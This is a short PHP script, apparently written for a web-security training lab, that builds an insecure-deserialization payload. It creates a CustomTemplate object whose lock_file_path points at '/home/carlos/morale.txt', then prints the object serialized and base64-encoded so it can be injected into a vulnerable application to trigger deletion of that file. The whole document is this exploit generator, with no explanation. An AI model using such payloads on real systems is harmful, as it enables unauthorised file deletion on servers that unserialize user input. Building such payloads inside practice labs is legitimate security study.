<?php
class CustomTemplate { 
    function __construct()
    {
        $this->lock_file_path = "/home/carlos/morale.txt";
    }
}
$customeTemplate = new CustomTemplate();
$serialized = serialize($customeTemplate);
echo "Serialized: " . $serialized . "\n";
var_dump($serialized);

echo "[+] Base64 Encoded: " . base64_encode($serialized) . "\n";
?>